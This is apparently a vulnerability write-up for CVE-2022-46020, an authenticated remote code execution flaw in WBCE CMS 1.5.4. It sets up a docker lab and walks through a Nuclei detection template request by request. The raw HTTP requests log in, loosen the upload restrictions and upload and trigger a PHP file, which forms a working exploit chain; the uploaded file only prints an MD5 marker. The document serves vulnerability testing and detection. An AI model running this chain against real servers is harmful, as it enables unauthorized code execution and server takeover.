# CVE-2022-46020 - WBCE CMS v1.5.4 Authenticated Remote Code Execution (Getshell)

## Description:

WBCE CMS version `1.5.4` contains an **Authenticated Remote Code Execution (RCE)** vulnerability. An attacker with valid credentials can upload a malicious file (webshell) and achieve command execution on the target server.


## References:

- [Technical Analysis (PDF)](https://github.com/10vexh/Vulnerability/blob/main/WBCE%20CMS%20v1.5.4%20getshell.pdf)

- [WBCE CMS Official Repository](https://github.com/WBCE/WBCE_CMS)

- [NVD Official CVE Details](https://nvd.nist.gov/vuln/detail/CVE-2022-46020)

- [Nuclei Official Template](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2022/CVE-2022-46020.yaml)


## Nuclei Template:

Nuclei template developed for CVE-2022-46020:

- [Template Link](https://github.com/Sourabh-Sahu/nuclei-templates/blob/main/http/cves/2022/CVE-2022-46020.yaml)


## Vulnerable Setup

To quickly deploy the vulnerable WBCE CMS v1.5.4 environment for testing:

```bash
docker-compose up -d
```

The application will be accessible at:

```bash
http://<your-docker-ip>/
```


## Nuclei Command:

Basic command to run the Nuclei template:

```bash
nuclei -u http://<target-ip>/ -t CVE-2022-46020.yaml -var username=admin -var password=password
```

**Example:**

```bash
nuclei -u http://192.168.2.160/ -t CVE-2022-46020.yaml -var username=admin -var password=password
```
![nuclei](https://github.com/user-attachments/assets/b590525e-2d0b-4621-b771-f15f233f68b2)


## Exploitation Steps

- After successful login, click on the Settings option from the sidebar.
- On the Settings page, click on Show Advanced Options. Locate the field named No upload for this filetypes.
  
![1](https://github.com/user-attachments/assets/e0c197cd-a8c9-4a0e-b2a2-6ea714fc5119)


- Remove the content from the No upload for this filetypes field. Click Save to apply changes.

![2](https://github.com/user-attachments/assets/a6c848cd-36f0-4e37-bd91-69ee6d700dce)

- Go to the Media section and click the upload button to upload your `payloadfile`

![3](https://github.com/user-attachments/assets/90ddb40c-d881-49cf-b14c-f96376432ff9)

- Now Check upload File.

![4](https://github.com/user-attachments/assets/9464163d-83c0-4899-81da-882f9db5ddd0)

- Visit the uploaded file in your browser.

![5](https://github.com/user-attachments/assets/b9ef6194-4ca2-43e7-a94a-3e526f84e3c8)


## Steps to Write Nuclei Template for CVE-2022-46020 (WBCE CMS v1.5.4 RCE)

####  Variables Section

```yaml
variables:
  username: "admin"
  password: "password"
```

- Defines two variables:
    
    - `username`: The login username (`admin` by default).
        
    - `password`: The login password (`password` by default).
        
- These variables will be reused in authentication requests.
    

####  First Request: Retrieve Login Page

```yaml
- raw:
    - |
      GET /admin/login/index.php HTTP/1.1
      Host: {{Hostname}}
```

**Purpose:**

- Sends a GET request to the login page `/admin/login/index.php`.
    
- This fetches the HTML content which contains dynamic form field names for username and password.
    



####  Extract Username and Password Field Names

```yaml
extractors:
  - type: regex
    name: username_fieldname
    group: 1
    regex:
      - name="username_fieldname" value="(.*)"
    internal: true
    part: body

  - type: regex
    name: password_fieldname
    group: 1
    regex:
      - name="password_fieldname" value="(.*)"
    internal: true
    part: body
```

**Explanation:**

- Extracts dynamic form field names for username and password using regular expressions.
    
- Stores them in internal variables `username_fieldname` and `password_fieldname`.
    
- Required for proper form submission in the next step.
    


####  Second Request: Perform Login

```yaml
- raw:
    - |
      POST /admin/login/index.php HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded

      url=&username_fieldname={{username_fieldname}}&password_fieldname={{password_fieldname}}&{{username_fieldname}}={{username}}&{{password_fieldname}}={{password}}&submit=Login
```

**Purpose:**

- Sends a POST request to `/admin/login/index.php` with:
    
    - The extracted dynamic field names for username and password.
        
    - Values from the earlier defined variables `username` and `password`.
        
- Attempts authentication with valid credentials.
    

####  Third Request: Access Settings Page for Tokens

```yaml
- raw:
    - |
      GET /admin/settings/index.php?advanced=yes HTTP/1.1
      Host: {{Hostname}}
```

**Purpose:**

- Accesses the settings page with `advanced=yes` parameter.
    
- The response contains additional tokens required for subsequent requests.
    



####  Extract `formtoken` and `app_name`

```yaml
extractors:
  - type: regex
    name: formtoken
    group: 1
    regex:
      - name="formtoken" value="(.*)"
    internal: true
    part: body

  - type: regex
    name: app_name
    group: 1
    regex:
      - name="app_name" value="(.*)"
    internal: true
    part: body
```

**Explanation:**

- Extracts:
    
    - `formtoken`: A CSRF-like token required for saving settings.
        
    - `app_name`: Application name parameter used in the next request.
        
- Stored as internal variables for reuse.
    



####  Fourth Request: Modify Upload Settings to Allow Dangerous File Types

```yaml
- raw:
    - |
      POST /admin/settings/save.php HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded

      advanced=yes&formtoken={{formtoken}}&...&app_name={{app_name}}&pages_directory=%2Fpages&media_directory=%2Fmedia&page_extension=.php&rename_files_on_upload=
```

**Purpose:**

- Sends a POST request to `/admin/settings/save.php`.
    
- Modifies key configuration options:
    
    - Changes `page_extension` to `.php`.
        
    - Alters upload settings to allow `.php` files to be uploaded.
        
- Prepares the application for arbitrary PHP file uploads, enabling RCE.
    


####  Fifth Request: Upload Webshell

```yaml
- raw:
    - |
      POST /modules/elfinder/ef/php/connector.wbce.php HTTP/1.1
      Host: {{Hostname}}
      Content-Type: multipart/form-data; boundary=---------------------------boundary

      -----------------------------boundary
      Content-Disposition: form-data; name="reqid"

      test
      -----------------------------boundary
      Content-Disposition: form-data; name="cmd"

      upload
      -----------------------------boundary
      Content-Disposition: form-data; name="target"

      l1_Lw
      -----------------------------boundary
      Content-Disposition: form-data; name="upload[]"; filename="{{randstr}}.php"
      Content-Type: application/x-php

      <?php echo md5("CVE-2022-46020"); ?>

      -----------------------------boundary
      Content-Disposition: form-data; name="mtime[]"

      1
      -----------------------------boundary--
```

**Purpose:**

- Uploads a `.php` webshell to the `/media/` directory.
    
- The shell, when accessed, outputs the MD5 hash of `"CVE-2022-46020"`.
    
- The filename is randomized using `{{randstr}}` to avoid detection.
    


####  Final Request: Trigger Webshell

```yaml
- raw:
    - |
      GET /media/{{randstr}}.php HTTP/1.1
      Host: {{Hostname}}
```

**Purpose:**

- Accesses the uploaded webshell via `/media/{{randstr}}.php`.
    
- Executes the PHP code, which outputs the MD5 hash if successful.
    



####  Matchers: Confirm Exploitation

```yaml
matchers-condition: and
matchers:
  - type: word
    part: body_6
    words:
      - 751a8ba516522786d551075a092a7a84

  - type: word
    part: header
    words:
      - text/html

  - type: status
    status:
      - 200
```

**Explanation:**

- Verifies:
    
    - The response body contains the correct MD5 hash: `751a8ba516522786d551075a092a7a84`.
        
    - The HTTP header includes `text/html`.
        
    - The response status is `200 OK`.
        
- All conditions must be true (`matchers-condition: and`) to confirm successful exploitation.
    
